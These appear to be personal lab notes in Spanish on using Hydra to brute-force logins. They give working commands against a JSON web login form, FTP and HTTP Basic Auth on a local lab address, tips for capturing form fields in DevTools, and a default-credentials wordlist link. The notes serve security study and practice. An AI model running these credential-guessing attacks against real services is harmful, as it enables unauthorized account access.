## Hydra

Herramienta para realizar **fuerza bruta** contra servicios de autenticación (web, FTP, SSH, básica...).

### Parámetros principales

| Parámetro | Función                |
| --------- | ---------------------- |
| `-l`      | Un usuario específico  |
| `-L`      | Lista de usuarios      |
| `-p`      | Una única contraseña   |
| `-P`      | Listado de contraseñas |
| `-s`      | Seleccionar el puerto  |
| `-f`      | Parar al primer usuario/válido encontrado |

### Web (formulario POST con JSON)

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 172.17.0.2 -s <PUERTO> http-post-form \
  "/login:{\"user\":\"^USER^\",\"password\":\"^PASS^\"}:H=Content-Type\: application/json:F=Incorrect"
```

- `"^USER^"` y `"^PASS^"` son los marcadores donde Hydra inyecta cada usuario/password.
- `F=Incorrect` es la cadena que aparece en la respuesta cuando el login falla.
- **Cómo obtener el `http-post-form`:** en la web, en el login, escribe cualquier cosa y pulsa Enter → `DevTools → Network → petición POST → Request`. Ahí copias la URL, el cuerpo del POST y el campo de fallo.

![[Pasted image 20260515001459.png]]

### FTP

```bash
hydra -L usuarios.txt -P pass.txt ftp://172.17.0.2 -s <PUERTO>
```

![[Pasted image 20260705143047.png]]

### HTTP Basic Auth

```bash
hydra -C /ruta/wordlist http-get://172.17.0.2 -s <PUERTO>
```

- `-C` → wordlist de posibles **usuario:password** con formato `"usuario":"password"`.
  ![[Pasted image 20260705161644.png]]
- `-f` → detener al encontrar credenciales válidas.
- `-s` → puerto.
- `http-get` → porque la autenticación ocurre en el index; si no, indica la ruta (`/"donde corra el login"`).

> Wordlist útil de credenciales por defecto: https://github.com/rix4uni/WordList/blob/main/default-username-password.txt